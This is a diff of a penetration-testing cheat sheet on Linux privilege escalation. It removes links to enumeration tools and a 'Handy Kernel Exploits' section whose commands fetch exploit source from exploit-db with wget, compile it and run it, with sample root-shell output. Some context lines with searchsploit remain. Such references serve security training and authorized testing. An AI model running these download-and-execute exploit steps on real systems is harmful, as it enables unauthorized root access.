@@ -1227,55 +1227,7 @@ Privilege Escalation
       - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - 
       
          [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)
-
-      - LinEnum - (Recently Updated)
-      
-      [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
-      
-      - linux-exploit-suggester (Recently Updated)
-      
-      [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-      
-      -   Highon.coffee Linux Local Enum - Great enumeration script!
-      
-          `wget https://highon.coffee/downloads/linux-local-enum.sh`
-
-      -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
-      
-    [https://github.com/PenturaLabs/Linux\_Exploit\_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
-
-      -   Linux post exploitation enumeration and exploit checking tools  
-      
-    [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
     
-
-Handy Kernel Exploits
-
--   CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
-
-    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
-    
-         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
-         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
-         $ ./i-can-haz-modharden
-         [+] launching root shell!
-         # id
-         uid=0(root) gid=0(root)
-
--   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
-    [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)
-
--   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
-    [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
-    Linux CVE 2012-0056  
-    
-          wget -O exploit.c http://www.exploit-db.com/download/18411 
-          gcc -o mempodipper exploit.c  
-          ./mempodipper
-
--   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
-    [https://dirtycow.ninja/](https://dirtycow.ninja/)  
-    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  
 
 -   Run a command as a user other than root  
 
@@ -1337,14 +1289,6 @@ Handy Kernel Exploits
               searchsploit "Linux Kernel"  
               searchsploit linux 2.6 | grep -i ubuntu | grep local  
               searchsploit slmail
-
- -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
- 
-     `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`
-
--   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***
-
-    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    
 
 -   Collect root password
 
